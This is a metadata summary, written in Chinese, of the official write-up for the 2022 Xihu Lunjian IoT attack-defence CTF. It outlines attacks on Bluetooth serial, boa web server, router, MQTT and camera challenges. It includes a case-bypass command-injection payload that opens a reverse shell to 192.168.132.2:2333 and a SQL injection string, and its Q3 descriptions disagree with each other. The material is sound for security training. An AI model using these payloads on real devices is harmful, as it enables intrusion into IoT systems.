...
- uhttpd
attack_chain:
- 'Q1 easybluetooth: ble-serial -d 连接 HZCSSC 蓝牙串口, 小写转大写绕过用 ${PATH:10:8} 截取, system 命令注入'
- 'Q2 xhttpd: boa web 服务 8080 端口, cgi-bin 脚本, 命令注入'
- 'Q3 A1 mips: MIPS 路由, RCE 通过 cgi-bin'
- 'Q4 Tenda AC: AC 系列路由, 已知 CVE / 弱口令'
- 'Q5 mqtt: 订阅 + 发布, 认证绕过'
- 'Q6 mipsel ipc: IPC 摄像头, mipsel 架构, 默认密码'
- 'Q7 hatmatrix 哈希长度扩展: SHA1/MD5 长度扩展拿 token'
- 'Q8 uhttpd: uhttpd 服务 CGI, 已知后门'
...
quality: high
full_path: 2022西湖论剑_IoT-AWD_赛题官方_WriteUp_（上篇）：一号固件&二号固件.full.md
meta_path: 2022西湖论剑_IoT-AWD_赛题官方_WriteUp_（上篇）：一号固件&二号固件.meta.md
images_removed: true
images_removed_count: 9
schema_version: v3.0.0-P0
summary: '2022 西湖论剑 IoT-AWD 赛题官方 WriteUp (上篇：一号固件&二号固件)。西湖论剑 IoT-AWD 1-2 号固件：蓝牙 HZCSSC + boa 8080 + MIPS 路由命令注入。关键路径：Q1 easybluetooth: ble-serial -d 连接 HZCSSC 蓝牙串口, 小写转大写绕过用 ${PATH:10:8} 截取, system 命令注入 → Q2...'
category: pwn
...
contest_type: open
wp_url: https://www.ctfiot.com/105717.html
reasoning_chain:
- 'Q1 easybluetooth: ble-scan 发现 HZCSSC 蓝牙串口 → 触发点：蓝牙串口映射到 /tmp/ttyBLE'
- 假设：ble-serial -d 连接 → screen /tmp/ttyBLE 进入题目 → 动作：ble-serial -d 00:00:00:00:00:FF
- 观察：发现 eblec 文件 ubus 调用 + 小写转大写操作 → 假设：system 命令注入点
- 动作：环境变量 ${PATH:10:8} 截取字符构造 payload 绕过大小写转换 → 动作：;${PATH:10:8}/${PATH:8:1}? 192.168.132.2 2333|...
- 观察：拿到 reverse shell
- 'Q2 boa 8080 web: HTTP 漏洞 → 假设：MIPS 路由器命令注入'
- 动作：分析 boa 路由 + form 提交 → MIPS shellcode → 观察：root 权限
- 'Q3 数据库 SQLite 注入: 单引号闭合 → 假设：SQL injection'
- 动作：' OR 1=1 -- → 观察：拿到 admin 凭证
failed_attempts:
- 试图用 cat 命令构造 payload → 失败：小写转大写破坏 cat
- 试图用 bluetoothctl → 失败：需要 ble-serial 工具
- 试图用浏览器访问 boa → 失败：MIPS 路由需要 telnet
key_observations:
- IoT AWD 模式 = 真机攻击；ble-serial 是蓝牙调试工具
- ${PATH:offset:length} 绕过大小写转换是 Linux bash 经典
- ubus 协议是 OpenWrt IoT 通用通信协议
- boa 是嵌入式 web server，常见于路由器固件
prerequisites:
- 蓝牙协议（BLE GATT） + ble-serial 工具
- OpenWrt ubus 协议
- Linux bash 字符串截取 ${PATH:10:8}
- MIPS 汇编 + qemu-mips-static
---
